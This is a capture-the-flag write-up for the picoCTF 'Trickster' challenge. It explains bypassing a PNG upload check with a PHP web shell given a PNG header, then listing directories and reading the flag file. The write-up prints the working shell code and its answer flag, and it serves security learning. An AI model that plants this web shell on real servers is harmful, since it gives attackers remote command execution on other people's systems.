# Challenge "Trickster" Writeup

## Vulnerability: File Upload and Directory Traversal

### Where: Insecure file upload validation and directory traversal led to accessing sensitive files.

### Impact: The challenge involved bypassing file upload restrictions to execute arbitrary commands on the server and retrieving sensitive files by exploring directories.

**NOTE**: The challenge tested the ability to bypass file type restrictions, upload a PHP shell disguised as a PNG, and explore the server's file structure to find the flag.

## Steps to reproduce:

1. **Check the `robots.txt` file:**
   I first examined the `robots.txt` file by navigating to `/robots.txt` and found the following:
```
    User-agent: * Disallow: /instructions.txt Disallow: /uploads/
```
   I visited the `/instructions.txt` file and found instructions on how the web app processes PNG images.

2. **Bypass the file upload restriction:**
I crafted a PHP web shell disguised as a `.png.php` file with a valid PNG header to bypass the PNG file upload validation and uploaded it through the web app.
```
echo -e '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php if(isset($_GET["cmd"])){ $cmd=$_GET["cmd"]; echo "<pre>".shell_exec($cmd)."</pre>"; } ?><form method="GET"><input type="text" name="cmd" placeholder="Enter Shell Command"><button type="submit">Run Command</button></form>' > exploit3.png.php

```

3. **Access the uploaded shell:**
After uploading the shell, I accessed the file and used it to run shell commands. I first used the following command to list the contents of the parent directory:
```
ls -R $(pwd)/..
```
This revealed several interesting files, including `MQZWCYZWGI2WE.txt`.

4. **Retrieve the flag:**
I used the `cat` command to display the contents of the `MQZWCYZWGI2WE.txt` file:
```
cat ../MQZWCYZWGI2WE.txt
```
Inside the file, I found the flag:
```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
```

## Conclusion:

By bypassing the file upload validation using a PHP web shell disguised as a PNG file, I was able to explore the file system and retrieve the flag, completing the challenge.


